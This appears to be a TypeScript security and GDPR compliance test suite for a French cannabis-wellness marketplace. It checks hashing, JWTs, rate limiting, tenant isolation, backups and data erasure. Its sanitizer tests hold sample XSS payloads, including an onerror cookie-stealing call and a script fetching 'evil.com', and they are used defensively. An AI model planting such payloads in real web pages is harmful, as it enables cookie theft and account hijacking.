import { db } from '../backend/db/database';
import { hashPassword, verifyPassword, generateToken, verifyToken } from '../backend/auth/auth';
import { SecurityService } from '../backend/services/security/securityService';
import { BackupService } from '../backend/services/security/backupService';
import { PrivacyService } from '../backend/services/security/privacyService';
import { SystemConfigService } from '../backend/services/security/systemConfigService';
import { UserRole } from '../src/types/entities';

export async function runSecurityComplianceTests(): Promise<{ passed: number; failed: number }> {
  console.log('\n======================================================');
  console.log('🛡️ [MODULE 18 TESTS] SECURITY, COMPLIANCE & RGPD AUDIT');
  console.log('======================================================\n');

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string, detail?: string) {
    if (condition) {
      console.log(`  ✅ [PASS] ${testName}`);
      passed++;
    } else {
      console.error(`  ❌ [FAIL] ${testName}${detail ? ` - ${detail}` : ''}`);
      failed++;
    }
  }

  // -------------------------------------------------------------
  // 1. AUTHENTICATION & PASSWORD CRYPTOGRAPHY
  // -------------------------------------------------------------
  console.log('▶ Suite 1: Authentification & Cryptographie des Mots de Passe');
  const plainPassword = 'NexusSecurePassword2026!';
  const hashedPassword = hashPassword(plainPassword);

  assert(hashedPassword.includes(':'), 'PBKDF2 password hash contains cryptographic salt delimiter');
  assert(verifyPassword(plainPassword, hashedPassword), 'Valid password verifies successfully against PBKDF2 hash');
  assert(!verifyPassword('WrongPassword123!', hashedPassword), 'Incorrect password fails verification safely');
  assert(!hashedPassword.includes(plainPassword), 'Plaintext password is never stored or exposed');

  // Token signature and expiration
  const mockUser: any = { id: 'usr_sec_test_01', email: 'test.sec@nexus.fr', role: UserRole.USER };
  const token = generateToken(mockUser);
  assert(typeof token === 'string' && token.split('.').length === 3, 'JWT token has valid 3-segment structure (header.payload.sig)');
  const decoded = verifyToken(token);
  assert(decoded !== null && decoded.sub === mockUser.id && decoded.role === UserRole.USER, 'JWT token decodes and verifies cryptographic HMAC signature');
  const tamperedToken = token.slice(0, -5) + 'xxxxx';
  assert(verifyToken(tamperedToken) === null, 'Tampered token signature is rejected by verifyToken');

  // -------------------------------------------------------------
  // 2. RATE LIMITING & BRUTE FORCE DEFENSE
  // -------------------------------------------------------------
  console.log('\n▶ Suite 2: Protection Anti-Brute Force & Rate Limiting');
  const testIpKey = 'ip_test_' + Date.now();
  let rateCheck;
  for (let i = 0; i < 5; i++) {
    rateCheck = SecurityService.checkRateLimit(testIpKey, { maxRequests: 5, windowSeconds: 10, lockoutSeconds: 30 });
  }
  assert(rateCheck?.allowed === true && rateCheck.remaining === 0, 'Allows requests up to configured maximum threshold');

  // 6th attempt should trigger lockout
  const blockedCheck = SecurityService.checkRateLimit(testIpKey, { maxRequests: 5, windowSeconds: 10, lockoutSeconds: 30 });
  assert(!blockedCheck.allowed, 'Excessive attempts trigger temporary IP lockout');
  assert((blockedCheck.retryAfterSeconds || 0) > 0, 'Returns precise retry-after wait duration for client');

  // Reset rate limit on success
  SecurityService.clearRateLimit(testIpKey);
  const resetCheck = SecurityService.checkRateLimit(testIpKey, { maxRequests: 5, windowSeconds: 10 });
  assert(resetCheck.allowed, 'Rate limit resets properly upon successful authentication');

  // -------------------------------------------------------------
  // 3. INPUT SANITIZATION & ANTI-INJECTION
  // -------------------------------------------------------------
  console.log('\n▶ Suite 3: Input Sanitization & Protection contre les Injections');
  const maliciousInput = '<script>alert("xss")</script><img src="x" onerror="stealCookies()">';
  const cleanInput = SecurityService.sanitizeString(maliciousInput);
  assert(!cleanInput.includes('<script>') && !cleanInput.includes('onerror'), 'Dangerous script and event attributes stripped');

  const nestedPayload = {
    title: '<b>Boutique CBD</b>',
    details: {
      comment: '<script>fetch("evil.com")</script>Super produit',
      tags: ['<svg/onload=alert(1)>', 'bio', 'france'],
    },
  };
  const sanitizedPayload = SecurityService.sanitizeObject(nestedPayload);
  assert(!sanitizedPayload.title.includes('<'), 'Recursive object sanitizer cleans nested string properties');
  assert(!sanitizedPayload.details.comment.includes('<script>'), 'Recursive object sanitizer cleans sub-objects');
  assert(!sanitizedPayload.details.tags[0].includes('<svg'), 'Recursive object sanitizer cleans array elements');

  // -------------------------------------------------------------
  // 4. MULTI-TENANT ISOLATION & IDOR DEFENSE
  // -------------------------------------------------------------
  console.log('\n▶ Suite 4: Isolation Multi-Tenant & Prévention IDOR');
  const shopOwnerA: any = { id: 'usr_owner_a', role: UserRole.SHOP_OWNER };
  const shopOwnerB: any = { id: 'usr_owner_b', role: UserRole.SHOP_OWNER };
  const platformAdmin: any = { id: 'usr_admin', role: UserRole.ADMIN };

  const checkA_accessA = SecurityService.assertShopAccess(shopOwnerA, 'shop_a', 'usr_owner_a');
  assert(checkA_accessA.allowed, 'Shop Owner A is authorized to access Shop A');

  const checkB_accessA = SecurityService.assertShopAccess(shopOwnerB, 'shop_a', 'usr_owner_a');
  assert(!checkB_accessA.allowed, 'Cross-tenant access BLOCKED: Shop Owner B CANNOT access Shop A');

  const checkAdmin_accessA = SecurityService.assertShopAccess(platformAdmin, 'shop_a', 'usr_owner_a');
  assert(checkAdmin_accessA.allowed, 'Platform Administrator is authorized to supervise Shop A');

  // IDOR resource ownership
  const idorCheckOther = SecurityService.assertResourceOwnership(shopOwnerB, 'usr_owner_a');
  assert(!idorCheckOther.allowed, 'IDOR protection blocks unauthorized access to third-party user resource');

  // -------------------------------------------------------------
  // 5. SANCTUAIRE DE SANTÉ & MASQUAGE DES NOTIFICATIONS
  // -------------------------------------------------------------
  console.log('\n▶ Suite 5: Sanctuaire de Santé & Masquage des Notifications');
  const sensitiveTitle = 'Rappel: Dosage THC de votre soirée';
  const sensitiveBody = 'Vous avez enregistré un joint de 15mg. Avez-vous eu un craving ?';
  const maskedResult = SecurityService.maskSensitiveNotification(sensitiveTitle, sensitiveBody);

  assert(maskedResult.wasSanitized === true, 'Detects sensitive health, dosage, and craving keywords');
  assert(!maskedResult.maskedTitle.includes('THC') && !maskedResult.maskedBody.includes('joint'), 'Masks sensitive words on lockscreen notification preview');
  assert(maskedResult.maskedTitle === 'Cannabis Care — Rappel Bien-être', 'Substitutes neutral, non-stigmatizing reminder title');

  // -------------------------------------------------------------
  // 6. PASSWORD RESET WORKFLOW
  // -------------------------------------------------------------
  console.log('\n▶ Suite 6: Workflow Sécurisé de Réinitialisation de Mot de Passe');
  const resetToken = SecurityService.createPasswordResetToken('usr_reset_test', 'reset.user@nexus.fr');
  assert(typeof resetToken === 'string' && resetToken.length >= 32, 'Cryptographic random reset token generated (>= 32 bytes hex)');

  const validConsumption = SecurityService.verifyAndConsumePasswordResetToken(resetToken);
  assert(validConsumption.valid && validConsumption.userId === 'usr_reset_test', 'Reset token validates successfully with user reference');

  // Try to reuse the token (replay attack test)
  const replayConsumption = SecurityService.verifyAndConsumePasswordResetToken(resetToken);
  assert(!replayConsumption.valid, 'Single-use guarantee: Replay of already consumed reset token is rejected');

  // -------------------------------------------------------------
  // 7. BACKUP & DISASTER RECOVERY (BACKUP -> RESTORE -> VERIFY)
  // -------------------------------------------------------------
  console.log('\n▶ Suite 7: Sauvegardes & Vérification d’Intégrité (BACKUP -> RESTORE -> VERIFY)');
  const backupResult = BackupService.createBackup('TEST_RUNNER');
  assert(backupResult.success && !!backupResult.backup, 'Database snapshot created successfully');
  assert(backupResult.backup?.checksumSha256.length === 64, 'SHA-256 cryptographic checksum computed for backup snapshot');
  assert(backupResult.backup?.tablesCount! >= 10, 'Snapshot captures all active tables and schemas');

  const verifyResult = BackupService.verifyBackup(backupResult.backup!.id);
  assert(verifyResult.success && verifyResult.integrityVerified, 'Verification procedure (BACKUP -> RESTORE -> VERIFY) validates integrity in sandbox');
  assert(verifyResult.details.checksumMatch === true, 'Sandbox snapshot checksum strictly matches original SHA-256 hash');

  // -------------------------------------------------------------
  // 8. RGPD DATA PORTABILITY & SAFE ERASURE
  // -------------------------------------------------------------
  console.log('\n▶ Suite 8: Droits RGPD (Export de données & Effacement sécurisé)');
  const users = db.get('users');
  let testSubjectUser = users.find((u) => u.email === 'demo.thc@cannabiscare.fr');
  if (!testSubjectUser && users.length > 0) testSubjectUser = users[0];

  if (testSubjectUser) {
    const exportResult = PrivacyService.exportUserData(testSubjectUser.id);
    assert(exportResult.success && !!exportResult.data, 'Structured GDPR export generated in standard JSON format');
    assert(exportResult.data.metadata.platform.includes('Cannabis Care'), 'Export includes official GDPR Article 20 legal notice');
    assert(exportResult.data.account.email === testSubjectUser.email, 'Export contains correct user account records');
  }

  // Create temporary user to test safe erasure + commercial code invoice retention
  const tempUserId = 'usr_temp_erasure_test';
  const tempEmail = 'temp.to.delete@nexus.test';
  users.push({
    id: tempUserId,
    email: tempEmail,
    passwordHash: hashPassword('testpwd123'),
    role: UserRole.USER,
    isEmailVerified: true,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  });
  db.get('thcProfiles').push({
    id: 'thc_' + tempUserId,
    userId: tempUserId,
    frequency: 'daily',
    estimatedMonthlyExpense: 100,
    mainMotivation: 'wellness',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  } as any);

  // Add dummy order to verify invoice anonymization rather than illegal destruction
  const globalOrders = db.get('globalOrders' as any) || [];
  globalOrders.push({
    id: 'ord_temp_retention',
    orderNumber: 'CMD-TEST-RETENTION',
    customerId: tempUserId,
    customerEmail: tempEmail,
    totalAmount: 49.90,
    currency: 'EUR',
    status: 'DELIVERED',
    createdAt: new Date().toISOString(),
    shippingAddress: {
      fullName: 'Jean Dupont',
      addressLine1: '12 rue de la Paix',
      city: 'Paris',
      postalCode: '75001',
      country: 'FR',
    },
  });
  db.save();

  const erasureResult = PrivacyService.deleteAccountSafely(tempUserId);
  assert(erasureResult.success, 'GDPR safe account erasure executed successfully');
  assert(erasureResult.deletedRecords.sanctuaryCleared, 'All sensitive health & THC profiles completely erased');

  // Verify health data is gone
  const remainingThc = db.get('thcProfiles').find((t) => t.userId === tempUserId);
  assert(!remainingThc, 'Sensitive THC profile confirmed non-existent in database');

  // Verify order invoice is pseudonymized rather than destroyed
  const retainedOrder = (db.get('globalOrders' as any) || []).find((o: any) => o.id === 'ord_temp_retention');
  assert(retainedOrder && retainedOrder.customerEmail.includes('anonymized_'), 'Financial invoice retained with pseudonymized customer identifier (Code de commerce Art. L123-22)');
  assert(retainedOrder.shippingAddress.fullName === '[DONNÉE SUPPRIMÉE RGPD]', 'Personal shipping address wiped from retained invoice');

  // -------------------------------------------------------------
  // 9. FEATURE FLAGS & MAINTENANCE MODE
  // -------------------------------------------------------------
  console.log('\n▶ Suite 9: Feature Flags & Contrôle du Mode Maintenance');
  const flags = SystemConfigService.getFeatureFlags();
  assert(Array.isArray(flags) && flags.length >= 5, 'System feature flags initialized');

  const initialToggle = SystemConfigService.isFeatureEnabled('carrier_tracking_live');
  SystemConfigService.toggleFeatureFlag('carrier_tracking_live', !initialToggle);
  assert(SystemConfigService.isFeatureEnabled('carrier_tracking_live') === !initialToggle, 'Feature flag state can be dynamically toggled with audit trail');
  // Revert
  SystemConfigService.toggleFeatureFlag('carrier_tracking_live', initialToggle);

  const sysConfig = SystemConfigService.getSystemConfig();
  assert(typeof sysConfig.maintenanceMode === 'boolean', 'System maintenance mode state accessible');
  assert(Array.isArray(sysConfig.activeCountries) && sysConfig.activeCountries.includes('FR'), 'Active countries configuration loaded');

  // -------------------------------------------------------------
  // 10. PRODUCTION READINESS EVALUATION (UNSIMULATED)
  // -------------------------------------------------------------
  console.log('\n▶ Suite 10: Production Readiness Score (Calcul Réel & Non Simulé)');
  const readiness = SystemConfigService.evaluateProductionReadiness();
  assert(typeof readiness.overallScore === 'number' && readiness.overallScore >= 0 && readiness.overallScore <= 100, 'Calculates numerical readiness score across 10 domains');
  assert(['READY', 'PARTIAL', 'NOT_READY'].includes(readiness.overallStatus), 'Evaluates realistic readiness status without simulated 100% false green');
  assert(Object.keys(readiness.categories).length >= 8, 'Covers all critical domains: SECURITY, PRIVACY, PAYMENTS, INFRASTRUCTURE, MONITORING, BACKUPS, LEGAL, TESTING');

  console.log('\n======================================================');
  console.log(`Summary: ${passed} passed, ${failed} failed.`);
  console.log('======================================================\n');

  return { passed, failed };
}

// Auto-run check for ESM
if (import.meta.url === `file://${process.argv[1]}`) {
  runSecurityComplianceTests().then(({ failed }) => {
    if (failed > 0) process.exit(1);
  });
}
